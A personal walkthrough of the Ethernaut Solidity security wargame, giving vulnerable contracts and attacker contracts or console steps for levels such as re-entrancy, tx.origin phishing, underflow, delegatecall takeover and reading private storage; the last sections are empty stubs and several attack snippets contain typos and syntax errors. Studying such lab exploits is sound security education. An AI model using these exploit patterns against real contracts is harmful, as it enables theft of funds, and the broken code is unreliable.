# Ethernaut Game

👩‍🚀 I'm completing [The Ethernaut](https://ethernaut.openzeppelin.com/) Game! 

----

Sections:
 - [Prerequisites](#prerequisites)
 - [Fallback](#1-fallback)
 - [Fallout](#2-fallout)
 - [Coin Flip](#3-coin-flip)
 - [Telephone](#4-telephone)
 - [Token](#5-token)
 - [Delegation](#6-delegation)
 - [Force](#7-force)
 - [Valut](#8-valut)
 - [King](#9-king)
 - [Re-entrancy](#10-re-entrancy)
 - [Elevator](#11-elevator)
 - [Privacy](#12-privacy)
 - [Gatekeeper One](#13-gatekeeper-one)
 - [Gatekeeper Two](#14-gatekeeper-two)
 - [Naught Coin](#15-naught-coin)
 - [Preservation](#16-preservation)
----

## Getting Started 

To play the Ethernaut Game there are some steps to do at each level. Here are the Prerequisites and the Steps to setup the levels. 

#### Tools & Prerequisites:
1. [MetaMask](https://metamask.io/) Wallet
2. Rinkeby Testnet ETH: You can get some from the [Rinkeby](https://rinkebyfaucet.com/) or [Paradigm](https://faucet.paradigm.xyz/) faucets. 
3. Console on Google Developer Tools 
4. [Remix](https://remix.ethereum.org/): Online Ethereum IDE

#### Steps:
1. Connect your wallet to the Ethernaut website. 

2. On each challenge you'll need to click "Get a New Instance." You'll need to approve the popup on your MetaMask and pay a transaction fee.  This button will deploy a smart contract. 

* You will not become the owner of the smart contract, instead an Ethernout account will. 
![Screen Shot 2022-07-11 at 22.18.36.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1657567121788/Ni6cwn58e.png align="left")

3. Open the Google Developer Tools Console. This is how to interact with the smart contract. 

4. On some challenges you'll need to deploy a smart contract. You can deploy one on [Remix](https://remix.ethereum.org/) without any additional setup. On Remix select "Injected web3" when deploying the smart contract to deploy from your Metamask. 
 
---

### 1. Fallback

> You will beat this level if
1. you claim ownership of the contract
2. you reduce its balance to 0

The goal of the challenge is to claim ownership of the smart contract and then drain the funds out. There is the "onlyOwner" modifier which is used on the withdraw() function that will allow us to withdraw the funds if we're the owner. 

First lets understand some terms that will be helpful for this challenge and then have a look at the code:
- Smart contracts have their own addresses and can receive money. Just like a user wallet address. 
- A [fallback function](https://www.geeksforgeeks.org/solidity-fall-back-function/) on a solidity smart contract is a function that has no name, is public and can not have any parameters. Its executed when there is a function identifier doesn't exists or the parameters are not specified for a certain function. It basically the goes to the fallback function. The fallback function was mainly used to get money into the smart contract, however the suggested way for a smart contract to receive money today is via the receive function. 
- [Solidity modifiers](https://docs.soliditylang.org/en/v0.8.13/contracts.html#function-modifiers) are used to check a condition before executing a function. The onlyOwner modifier is a frequently used modifier for functions that only the owner of the contract should be able to execute, such as for withdrawing funds from a contract. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; // specify the version of solidity for the compiler 

import '@openzeppelin/contracts/math/SafeMath.sol';
// this is the library to perform mathematical operations safely. 

contract Fallback {

  using SafeMath for uint256;

  // keep track of the addresses and the relative contributions 
  mapping(address => uint) public contributions; 

  // keep the owner address of the smart contract
  // address type is a solidity variable 
  address payable public owner; 

  // constructor is only called once when the contract is deployed 
  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  // modifiers are added to functions, if the condition is satisfied the func is executed 
  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  // get the amount a user has sent to the smart contract and store it in the mapping 
  function contribute() public payable {
    // a require statement checks for a condition and if satisfied moves to the next line 
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  // get the contribution of a certain user 
  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  // get the money out of the smart contract
  // only the owner can execute this function 
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  // this is the fallback function which has no name and executed when no other 
  // function matches 
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
``` 

Important to note that even though we are clicking the button to xx the smart contract it is an Etheranout account thats deploying the smart contract, we are only initiating the transaction. 

#### Solution: 
1. When you open the console, you can have a look at the contract. 
 - check the owner
 - your account address (the player)
 - contributions mapping. 
 
 In order to call the withdraw function there are two conditions:
 - msg.value > 0 --> meaning that the value you send in must be larger than 1
 - contributions[msg.sender] > 0 --> you are in the contributions mapping. Lets satisfy these two conditions 
2. Contribute to the smart contact by calling the contribute() function. 
3. Check the contributions mapping, you should see yourself on there 
4. Now we want to call the fallback function with a value greater than 0. If we satisfy the two conditions then we will be the owner of the function. 
5. Once you are the owner, call the withdraw() function to get the funds out of the smart contract. 

---

### 2. Fallout

> Goal: Claim ownership of the contract below to complete this level.

Let's have a look at the smart contract. I have only added the section that we will be needing to solve the challenge. 

```
contract Fallout {

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

}
``` 
In the above code snippet we have a contract called Fallout and a method that seems to be a constructor. 

A [constructor](https://docs.soliditylang.org/en/v0.8.13/contracts.html#constructor) is a function that is executed when the contract is deployed. It is only executed once and is an optional function. A constructor uses the keyword "constructor" or the name of the smart contract.

#### Solution: 
In the code above there is a function called "Fal1out" which looks like a constructor but actually is not. There is a typo in the name and instead of an "l" there is a "1." So, we are able to call the function, which will transfer the ownership of the smart contract.  

---

### 3. Coin Flip

> This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

We need to know the correct dice result 10 times in a row in order to complete the challenge.

This challenge is about showing that a blockchain is a deterministic system and you can not randomness and we're going to understand why. You don't want to code a random number generator in your smart contract and we'll show why. If you want to introduce randomness you'd want to this via a randomness oracle. 

Let's first cover some key terms and check the smart contract which will be helpful for crafting the solution. 
Key terms
- Randomness on a blockchain:
- Oracle 
- [Blockhash()](https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html): its a global function in solidity that returns the hash of a given block. 
- Block.number: global variable that returns the current block number

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256; // all integers should use the SafeMath Library 
  uint256 public consecutiveWins; // the frontend can get access to this  

  // used for determining randomness
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  // takes a bool thats the guess of the user 
  // returns a bool thats true if guess is correct, false otherwise
  function flip(bool _guess) public returns (bool) {

    // given block, returns the hash 
    // subtract 1 from the block.number because otherwise it returns the current block 
    // which has not been mined yet since the block is not mined it will not have a hash. 
    uint256 blockValue = uint256(blockhash(block.number.sub(1))); 

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue; // save the blockValue as the lastHash 
    uint256 coinFlip = blockValue.div(FACTOR); // integer division with a constant number 
    bool side = coinFlip == 1 ? true : false; // decide on the side based on the number 

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
``` 

The security vulnerability is in the flip function. The random number is being generated based on the blockhash of the previously mined block.  This can be copied by another contract to make the same calculation and then that contract can call the flip() function with the correct result. 

#### Solution: 
1. Copy and paste the smart contract to Remix. 
2. Create a new smart contract on Remix, this will be the attacker smart contract.
3. Here's the code for the guesser contract. I have added comments to explain whats going on. 
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;

 import './CoinFlip.sol'

 contract CoinFlipGuesser {

   CoinFlip public victimContract;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

   constructor(accress _victimContractAddress) public {
       // get the victim contract 
       victimContract = CoinFlip(_victimContractAddress)
   }

   // Use the same logic in the coinFlip function to get the same result
   // call the flip function on the victim contract with the correct result 
   function flip(bool _guess) public returns (bool) {
     uint256 blockValue = uint256(blockhash(block.number.sub(1)));
     uint256 coinFlip = blockValue.div(FACTOR);
     bool side = coinFlip == 1 ? true : false;
     victimContract.flip(side)

    }
 }
 ``` 
4. Get the coinflip address from Ethernaout. 
5. On remix use the coinflip contract address to deploy the Guesser contract. 
6. Execute the flip function on the malicious contract. This will flip a coin but with the result thats pre-calculated, so it should be the correct guess. 
7. Run the command on the google developer tools. It should be incremented. 
```
await contract.consecutiveWins()
``` 
When you flip the coin correctly 10 times you'll complete the challenge. 

---

### 4. Telephone

> Claim ownership of the contract below to complete this level.

The goal of the challenge is to become the owner of the contract. 

In order to hack it here are some helpful terms:
- tx.origin: sender of the transaction (full call chain), this is the original external account (EOA). Only an EOA can initiate a transaction.  
- msg.sender: immediate account (can be a smart contract account or an externally owned account)

The part of the smart contract that we are interested in is the changeOwner(address _owner) function. 

```
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }

``` 

Checkout the contract
contract
contract.abi
await contract.owner() --> look at who the owner is

Bottom line: Do NOT use **tx.origin** for authorization! This makes the smart contract vulnerable to phishing attacks since the attacker can trick someone into starting the transaction. You can read more on the security considerations page over [here.](https://docs.soliditylang.org/en/v0.8.16/security-considerations.html?highlight=tx.origin#tx-origin)

#### Solution: 
1. Create a new smart contract on Remix. Deploy the telephone contract.;
2. create new telephoneHack solidity file. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Telephone.sol';

contract TelephoneHack {

  Telephone telephoneContract;

  constructor(address _address) public {
    telephoneContract = Telephone(_address);
  }

  function hackContract(address _address) public {
    telephoneContract.changeOwner(_address);
  }
}
``` 

3. get the contract.address
4. deploy with the contract.address 
5. await contract.owner()
6. execute hackContract() with your address 
7. await contract.owner()

*basically we made a transaction from the smart contract as the tx.origin. 

---

### 5. Token 

> You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

This challenge will show arithmetic underflow and overflows. It's important to use the correct mathematical operations so that you're not vulnerable to this type of attack. 

Let's start by covering some terms and looking at the smart contract.
- Odometer: shows you how many miles you have travelled. 
(ADD IMAGES)
- Arithmetic Overflow: Adding an additional number to the current space.
- Arithmetic Underflow 
- Uint: unsigned integer 256. 
- SafeMath Library: its the safe way to perform aritmetic operations that prevents the overflow/underflow errors. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances; // stores the address and how many tokens they have 
  uint public totalSupply; // uint is short for uint256

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply; // deployer has an initial supply 
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // must be satisfied to move forward
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  // read function to get the balance of a certain address
  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner]; 
  }
}
``` 

The vulnerability is in the transfer function, it has to do with performing math operations.

```
contract.abi
await contract.balanceOf()
``` 

#### Solution: 
1. There is a vulnerability in the require statement of the transfer function: 
```
require(balances[msg.sender] - _value >= 0)
``` 
This is always going to be true because we are mapping to unsigned integers. 
2. Use the transfer function to send more tokens than you currently have. This will trigger an arithmetic underflow. 
```
address random_address = "xx"
await contract.balanceOf(player)
contract.transfer(random_address, 21) 
``` 
3. Have a look at how many tokens you have. 
```
await contract.balanceOf(player)
await contract.balanceOf(random_address)
```
As you can see we've got lot more than we started with. 

---

### 6. Delegation 

> The goal of this level is for you to claim ownership of the instance you are given.

First some key terms and then lets dig into the smart contract (there actually are 2 contracts in one file):
- delegatecall:
- Method Ids:
- Fallback methods:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner; 
  }

  // lets you set the owner of the contract 
  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate; // reference the Delegate contract 

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress); // refer to a deployed contract 
    owner = msg.sender; // msg.sender can be a smart contract address or an EOA (externally owned account)
  }

  // function with no name: a fallback function
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data); // bool result from delegatecall
    if (result) {
      this;
    }
  }
}
``` 

We will be interacting with the second smart contract and you can verify that by running the command below. 
```
contract.abi 
``` 
So delegatecall allows you to invoke a function on another smart contract. 

#### Solution: 
1. See who is the owner for the contract: await contract.owner()
2. lets get the  signature to pass into pwn()
var pwnSignature = web3.utils.sha3("pwn()")
3. on our contract lets call the fallback function and pass the signature.
contract.sendTransaction({data: pwnSignature}) 
4. now check the contract owner.
await contract.owner()

---

### 7. Force 

>Some contracts will simply not take your money ¯\_(ツ)_/¯
>The goal of this level is to make the balance of the contract greater than zero.

Smart contract have addresses and are able to send/receive money. There are two type of accounts on Ethereum:
- Smart contract accounts 
- Externally owned accounts (EOA)

In this level, we need to add money into the contract thats an empty smart contract. After you create an instance of the smart contract, here are some steps to learn more about the contract you've deployed:
- contract.abi() --> on the developer console 
- check the smart contract on rinkeby etherscan (contract.address) - you'll see the bytecode for the smart contract. Because the contract is not verified you will not be able to see the code. 
- await getBalance(contract.address)

Let's look at the ways a smart contract can receive money:
1. fallback function 
2. receive function 

You can try to send funds to the smart contract:
```
contract.sendTransaction({value:1})
``` 
Here is the error message that comes up:
ADD_SCREENSHOT 

#### Solution: 
1. On Remix create a new contract. This contract will selfdestruct and before doing so it will send all the funds to our Force contract. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttacker {
  constructor() payable{
  }
  function attack(address _contractAddress){
    selfdestruct(_contractAddress) // before the self destruct it will send the money to the specified smart contract
  }

}
``` 
2. Execute the attack function, and add the Force contract address. 
3. Head back to the Ethernaut page and check the balance on your Force contract. 
```
await getBalance(contract.address)
``` 

**This is way that auditors know about to send funds to a smart contract that does not have the functions to receive any.**

---

### 8. Valut  

> Unlock the vault to pass the level!

We can understand the goal of the challenge better when we have a look at the smart contract for it. It is to set the boolean "locked" to false. 

Here are the key terms and the smart contract. 
- Storage: when a smart contract gets deployed it gets a certain amount of storage. Storage is slipt into slots and the variables are put into slots. Everything is stored in binary.  
- Private variables: private variables can only be accessed within that contracts code. No other contract code can get access to it, but we can read it. Blockchains are not for confidential data.  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  // the password can unlock the lock 
  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
``` 

Don't let the private keyword fool you into thinking that its actually private. 

From the developer tools you can read some data about the contract:

```
contract.abi 
contract
await contract.locked 
contract.address
``` 
You can check the storage space given to the smart contract:
```
web3.eth.getStorageAt(contract_address)
``` 

**Bottom line: Nothing is private on a blockchain, you can encrypt but thats an extra measure added by you. **

#### Solution: 
Since everything is stored on the blockcahin and this is all accessiable the goal is to get the slot where the password is stored. We want to determine that slot and then call the "web3.eth.getStorageAt" function. 

1. decrale a variable pwd
"var pwd"
2. call the getStorageAt function
web3.eth.getStorageAt(contract_address, 0, function(err, result){pwd=result})
--> this will give the locked value. 
now do it for slot value-2 (index 1), which will be the password. 
web3.eth.getStorageAt(contract_address, 1, function(err, result){pwd=result})
--> the result will be in binary representation. 
3. convert binary to assci
web3.utils.toAscii(pwd)
the printed result is the password. 
4. unlock the smart contract
``` 
await contract.locked()
contract.unlock(pwd)
await contract.locked()
``` 
---
### 9. King  

> When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

This hack is about a game called King of ether: https://www.kingoftheether.com

here's how the game is played as explained on the ethernaout site:

> The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

We want to hack the contract so that no one can become king. 

First some key notes and then the contract:

- Now important to note that when you are making a transaction to another smart contract you should have an error handling mechanism. If the smart contract you are making a call to fails than you transaction will not pass. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
``` 

to hack the contract no one should be able to call "king.transfer(msg.value);"

#### Solution: 

1. we'll create a new smart contract on Remix.
2. create a new solidity file attackking.sol 
3. here is how the contract should be, have a look at the comments for whats going on. 
-our contract will become the king, then when someone else wants to become king we are not going to allow them to transfer the ownership 
- we can just not put a fallback function on our contract and then noone can reclaim ownership 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackKing {
  constructor(address _king) public payable {
    address(_king).call.value(msg.value)();
  }

  function() external transfer {
    revert("you loose!");
  }

}
``` 

The transfer function will not work on this smart contract. You shouldn't assume that the smart contract you make a function call to will have its error handling or a fallback function by default. 
4. check the prize value in the contract. we need to put more money than the curent price amaount. 
await contract.prize() // in gwei
await contract._king() // get the current king
5. deploy the malicious smart contract with a larger amount than the prize. 
6. check who is the king 
await contract._king() // get the king

---
### 10. Re-entrancy  

>The goal of this level is for you to steal all the funds from the contract.

This is an important attack type, that became famous with the [DAO Attack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). After the Attack Ethereum forked to undo the malicious transaction. It became: Ethereum and Ethereum Classic. Ethereum Classic kept the malicious transaction. Its an important point in the history of Ethereum where the transaction was undone by individuals. 

Here are important background information and then an overview of the smart contract we'll be hacking for this level.
- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.

Here's the smart contract that contains the re-rentrancy vulnerability:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances; // internal recording 

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) { // internal helper 
    return balances[_who];
  }

  // the amount is sent out of the account before the state var is updated!
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}(""); // one of the ways to send money 
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount; // update the internal balance recording 
    }
  }

  receive() external payable {}
}
``` 

The hack to the contract will be by writing another smart contract that will take advantage of the vulnerability.

We create a recursive re-rentrancy loop. In this loop we withdraw the funds before the balanaces are updated. 

####  Solution:
1. Open Remix and import the smart contract. Change the safemath libary location:
"import https://github/openzeppelin/contracts/math/SafeMath.sol"
change receive to fallback 
2. create a new smart contract called ReentranceAttack.sol
3. here is the code for the ReentranceAttack.sol. deploy the contract with some ether (you will need to pay for gas)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrance.sol';

contract ReentranceAttack {
  
  Reentrance public reentranceContract;
  uint public amount =  ether; // withdraw each time

  constructor(address _reentranceContractAddress) public {
    reentranceContract = Reentrance(_reentranceContractAddress);
  }

  function donateToTarget() public {
    reentranceContract.donate.value(amount).gas(4000000)(address(this)); 
}

  fallback( ) external payable  {  
    if (address(reentranceContract).balance != 0){
      reentranceContract.withdraw(amount);
    }
  }

}
``` 
4. add some funds to the vulnerability contract. 
5. execute the function on your attack function. 

**how to prevent the attack:**
- make sure to update the state variable before you make a function call to an external contract. this is also called as "checks and effects best practice on solidity."
- mutex: puts a lock on a contract state and then only the owner can unlock. this ensures that only a signle funtion is execute at the same time. (have a modifer that checks if the contract is locked or not. locked meaning that theres a function call thats curently executing.) this way someone can not call the function recursively while the function is already executing. heres how the code looks like:

```solidity
bool internal locked;

// add this modifier to the withdraw func
modifier noReentrancy{
  require(!locked, "no more re-rentrancy");
  locked = true;
  _;
  locked = false;
}
``` 

---
### 11. Elevator 

> This elevator won't let you reach the top of your building. Right?

The goal of the hack is to reach the top of the building. Let's clear some terms and then have a look at the smart contract that we'll be hacking for this step. 

- Interface in solidity: they help to generate an API for the contract so that the smart contracts can communicate.  
- [Visibility](https://solidity-by-example.org/visibility/ ): defines who can call the function (public, private, internal, external)
- [Modifiers](https://docs.soliditylang.org/en/v0.8.14/cheatsheet.html?highlight=modifiers#modifiers): how functions will interact with the state on the blockchain (eg: view would allow you to read from the blockchain but not modify). The default is that it will allow to read and change the data on the blockchain. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// interface specifies the name of the fucntion that the object needs to implement
interface Building {
  function isLastFloor(uint) external returns (bool);
}

// the contract to hack 
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) { //isLastFloor is in the Building contract 
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

``` 

Check which floor you are on:
```
await contract.floor()
``` 

####  Solution:
1. Open Remix and import the smart contract. 
2. Create a new smart contract: ElevatorAttack.sol and import the Elevator.sol file. 
Here's how the attcak contract should look like:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Elevator.sol';

contract ElevatorAttack {
  bool public toogle = true;
  Elevator public target;

  constructor(address _targetAddress) public {
    target = Elevator(_targetAddress);
  }
  
  function isLastFloor(uint) public returns (bool){
    toggle = !toogle;
    return toogle;
  }
  
  function setTop(uint _floor) public{
    target.goTo(_floor);
  }
}

``` 

3. Deploy the smart contract with the target address
contract.address()

4. Call the setTop function on Remix with floor number: 10 for example. 

We bascially added a new logic for the interface function because the interface allows us to modify the state. 

---
### 12. Privacy 

> The creator of this contract was careful enough to protect the sensitive areas of its storage.

> Unlock this contract to beat the level.

So, we're going to have to unlock the contract in order to pass the level. 

Let's cover some of the basics needed for the challenge and then the smart contract.
- Casting: In solidity you need to define the type of the varibale. Its a static language. 
https://www.tutorialspoint.com/solidity/solidity_conversions.htm
- Web3 provider: metamask is a user wallet that injects and object called web3 to comunicate to the blokchain. 

The contract has different variables and not many functions. It only has a contructor and a function called unlock. When we pass the right key into the unlock funtion, then we can unlock the lock. The goal is to get the last elment in the data array. (index starts at 0)

Storing sensitive information on a blockchain is not a good idea, anyone can retriev it. You can hash it but then you need to keep your keys safe. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true; // first state variable 
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data; // declares an array of size 3 

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2])); // if it equals the last element of thr data array 
    locked = false; // unlock the lock :-) 
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

``` 
checkout the: contract.abi

All state varibales in a smart contract are there for anyone to read, even the private ones. In Ethereum the code, and so the variables are stored in slots. The more storage space a smart ocntract consumes the more gas it consumes, so as a contract developer you need to opimitize the space you use for your contract. You should optimize the posisiton of your variables to optimize for gas (you can remove the need to have an extra slot). 

####  Solution:
Since all the variables are stored in slots, when we figure out which slot to get we can get the last variable on the data array. Passing this variable will allow us to unlock the contract. Let's query everything in the contract. 
1. web3.eth.getStorageAt(SLOT_TO_QUERY). 
2. Instead of trying one by one here is a script to query and give us all the data in the storage:
```
let storgae = []

let callBackFNConstructor = (index) => (error, contractData) => {
 storage[index] = contractData
}

for (var i = 0, i<6) { // 6 because there is a max 6 variables in storage 
 web3.eth.getStorageAt(contract.address, i, callBackFNConstructor)
}
``` 
Copy and paste in your browser. The storage array should be populated that represents the slots. 
3. On index 3 there are 3 variables:
- 265: ff 
- 10: 0a
- awkwardness: 9cb3 
Solidity was able to optmize and fit the 3 variables in one. 

The last 3 slots represent the data array. Each element in the array has its own slot. So we know that to unlock the contract we need the last item on the index array. It is the last element on the storage array, index: 5
storage[5] // this is the element that we need to convert to a byte format. 
4. Go to remix and create an attack contract. This attack contract will call the privacy contract and pass the value in the unlock function. 
5. Copy the Privacy contract, we will import it on our attack contract. 
5. Here is how our attack contract should look like. 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Privacy.sol';

contract PrivacyAttack {
  Privacy target;

  constructor(address _targetAddress) public {
    target = Privacy(_targetAddress);
  }
  function unlock(byte32 _slotValue) public{
     byte16 key = byte16(_slotValue); //type conversion in solidity, aka: casting 
     target.unlock(key);
  }
  
}
``` 
6. Deploy the privacy attack contract with teh address of the deployed Privacy contract 
7. Execute the unlock function with the key at storage[5] (its the last slot on the Privacy contract)
await contract.locked()

Lesson learned: if you store data on the blockchain its viewable by everybody. nothing is ever private on a blockchain. the way you declare the varaiable defines how much storage space it will take up. 

---
### 13. Gatekeeper One 

> Make it past the gatekeeper and register as an entrant to pass this level. 

Let's first review the tips that are given to us in the challeneg:
- special function gasleft(). (Note: you can play around with the gas settings in the complier settings tab and see what is changed.)
- tx.origin vs. msg.sender: this was covered in the previous telephone challange. Remember that only wallet addresses can be tx.origin (they are an EOA account). On the other hand, msg.sender can be both a wallet address and a user address. Msg.sender is typically who you want to authenticate. 
- Date type conversions: when you convert a data type which uses a large storage to a smaller one you will loose the space it takes up. This means that the data will be lost or corrupt. 

####  Solution:
1. To pass GateOne we will create contract to be a middleman. Create a contract called GateHack.sol with the following:
contract Hack {
    GatekeeperOne gate = GatekeeperOne(//YOUR ADDR);
    ...
}
2. To pass Gate3 we will use the data conversion. Bascially it needs to fullfill: bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
3. To pass Gate2 the gas multiplier needs to be a multiplier of 8191. In order to pass we need to calculate the gas. Look at the compiler version & settings on Etherscan. 
The contract was compiled with:
- version v0.4.18  
- no optimization enabled
4. Create a function to allocate a specified amount of gas. 
function hackGate() public {
    gate.call.gas(99999)(bytes4(keccak256('enter(bytes8)')), key);
}


Bottom lines:
- Do not use tx.origin as an authorization check!!
- Be careful with data conversions and corruptions 
- Save gas by not storing unnecassry variables and doing less operations 
- Different complier settings yield different gas so be careful with using it to make checks. 

---
### 14. Gatekeeper Two 

> Register as an entrant to pass this level.

It is similar to Gatekeeper One, now we have different gates which introduces a few new challenges. 

Let's review the topics first:
- Solidity modifiers
- Assembly keyword: allows a contract to access functionality that is not native to vanilla Solidity. It basiclly allows you to access the EVM at a lower level, this gives you more control. 
- The ^ character in the third gate is a bitwise operation (XOR). Bitwise operations allow to make optimizations to the code, you can save space and make the operation faster. 

Here's how we can pass the gates:
1. For Gate 1 it is the same as the previous challenge. We need to create a sperate smart contract in the middle that will take advantage of using tx.origin (EOA) and the msg.sender (last account). Msg.sender will be the calling sender smart contract, the tx.origin will be our wallet address.  

2. For Gate 2 it introduces the assembly keyword. The extcodesize is a code to give the size of the smart contract code size and assigning it to the variable x. Basically we want the calling contract size to be 0. 

3. For Gate 3 takes a _gateKey and the requirement is that the XOR operation is equal to uint64(0) - 1.
(PUT AN XOR Image)

####  Solution:
1. Go to remix and create a GatekeeperTwoAttack.sol contract. 

2. Here is how the contract should look like, you can see the comments that explain how we pass the gates:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {

  constructor(address _address) public {
    // we will pass gate3 with the key 
    bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    
    // abi.encodeWithSignature how to call a function without importing the interface
    // this contract call is happening in the constructor, if you try to check a code during the constructor it will return an empty value
    // thats because the contract has not been made yet. It has an address, but its not finished so the size will be 0. 
    // thats how we pass gate 2
    _address.call(abi.encodeWithSignature('enter(bytes8)', _key)); 
   
  }
}
```

3. Compile the contract with the original GatekeeperTwo address. 
contract.address 

---
### 15. Naught Coin 

> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

``` 
####  Solution:

---

### 16. Preservation 

> The goal of this level is for you to claim ownership of the instance you are given.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

``` 
####  Solution:

---

### 16. NAME 

> desc

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

``` 
####  Solution:
